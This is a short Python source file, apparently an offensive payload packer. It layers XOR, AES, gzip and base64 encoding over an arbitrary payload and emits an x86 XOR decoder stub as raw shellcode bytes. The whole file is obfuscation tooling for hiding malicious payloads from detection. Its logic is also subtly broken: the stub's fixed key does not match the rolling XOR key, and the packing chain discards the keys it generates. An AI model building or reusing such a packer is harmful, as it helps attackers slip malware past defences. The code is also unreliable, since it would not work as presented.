# -*- coding: utf-8 -*-
"""Payload packer -- XOR/AES/b64gzip layers, stub generation.

Author: zxwn
"""
import base64, gzip, os, struct, hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


def xor_layer(data: bytes, key: int = None) -> tuple:
    if key is None:
        key = ord(os.urandom(1))
    result = bytearray(len(data))
    k = key
    for i, b in enumerate(data):
        result[i] = b ^ (k & 0xFF)
        k = (k * 0x41 + 0x1B) & 0xFFFFFFFF
    return bytes(result), key


def aes_layer(data: bytes, key: bytes = None) -> tuple:
    if key is None:
        key = os.urandom(16)
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    pad_len = 16 - (len(data) % 16)
    padded = data + bytes([pad_len] * pad_len)
    return iv + encryptor.update(padded) + encryptor.finalize(), key


def gzip_layer(data: bytes) -> bytes:
    return gzip.compress(data)


def b64_layer(data: bytes) -> bytes:
    return base64.b64encode(data)


def generate_xor_stub(key: int) -> bytes:
    return bytes([
        0xEB, 0x10,
        0x5E, 0x56, 0x59,
        0x8A, 0x06,
        0x34, key & 0xFF,
        0x88, 0x06,
        0x46,
        0xE2, 0xF8,
        0xFF, 0xE1,
        0xE8, 0xEB, 0xFF, 0xFF, 0xFF,
    ])


def full_chain_pack(payload: bytes, layers: list = None) -> bytes:
    if layers is None:
        layers = ["gzip", "aes", "b64"]
    data = payload
    for layer in layers:
        if layer == "xor":
            data, _ = xor_layer(data)
        elif layer == "aes":
            data, _ = aes_layer(data)
        elif layer == "gzip":
            data = gzip_layer(data)
        elif layer == "b64":
            data = b64_layer(data)
        elif layer == "reverse":
            data = data[::-1]
    return data


if __name__ == "__main__":
    print("[packer] Loaded.")
